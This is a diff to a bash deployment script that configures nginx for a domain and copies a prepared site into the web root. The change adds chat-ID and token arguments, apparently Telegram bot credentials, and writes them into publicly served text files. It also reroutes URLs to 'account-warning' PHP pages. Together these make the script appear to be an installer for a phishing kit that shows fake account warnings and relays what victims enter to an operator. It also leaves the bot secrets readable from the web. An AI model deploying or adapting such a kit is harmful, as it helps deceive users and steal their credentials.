@@ -1,14 +1,16 @@
 #!/bin/bash
 
 # Check if domain parameter is provided
-if [ -z "$1" ]; then
-    echo "Usage: $0 <domain>"
+if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
+    echo "Usage: $0 <domain> <chatid> <token>"
     echo "Example: $0 example.com"
     exit 1
 fi
 
 DOMAIN=$1
 WWW_DOMAIN="www.$DOMAIN"
+CHAT_ID=$2
+TOKEN=$3
 NGINX_AVAILABLE="/etc/nginx/sites-available/$DOMAIN"
 NGINX_ENABLED="/etc/nginx/sites-enabled/$DOMAIN"
 WEB_ROOT="/var/www/html/$DOMAIN"
@@ -49,6 +51,17 @@ if [ -d "/var/www/html/source" ]; then
     sudo cp -r /var/www/html/source/* $WEB_ROOT 2>/dev/null || true
 fi
 
+# Update chat_id.txt and token.txt if parameters are provided
+if [ ! -z "$CHAT_ID" ]; then
+    echo "Updating chat_id.txt..."
+    echo "$CHAT_ID" | sudo tee "$WEB_ROOT/chat-id.txt" > /dev/null
+fi
+
+if [ ! -z "$TOKEN" ]; then
+    echo "Updating token.txt..."
+    echo "$TOKEN" | sudo tee "$WEB_ROOT/token.txt" > /dev/null
+fi
+
 # check config file
 if [ -f "$NGINX_AVAILABLE" ]; then
     rm -rf $NGINX_AVAILABLE
@@ -75,12 +88,12 @@ server {
     root $WEB_ROOT;
     index index.html index.htm index.php;
 
-    location ~ ^/latest-settings-info/([^/]+)/([^/]+)/?$ {
-        rewrite ^/latest-settings-info/([^/]+)/([^/]+)/?$ /latest-settings-info-page.php last;
+    location ~ ^/account-warning/([^/]+)/([^/]+)/?$ {
+        rewrite ^/account-warning/([^/]+)/([^/]+)/?$ /account-warning-page.php last;
     }
 
-    location ~ ^/latest-settings-info/([^/]+)/?$ {
-       rewrite ^/latest-settings-info/([^/]+)/?$ /latest-settings-info.php last;
+    location ~ ^/account-warning/([^/]+)/?$ {
+       rewrite ^/account-warning/([^/]+)/?$ /account-warning.php last;
     }
 
     location / {
@@ -108,5 +121,9 @@ sudo nginx -t
 echo "Reloading Nginx..."
 sudo systemctl restart nginx
 
-echo "Setup completed for $DOMAIN!"
+echo "Setup completed for $DOMAIN/account-warning/account-warning/account-warning!"
+
+cat $WEB_ROOT/chat-id.txt
+cat $WEB_ROOT/token.txt
+
 echo "Please check if everything is working correctly"
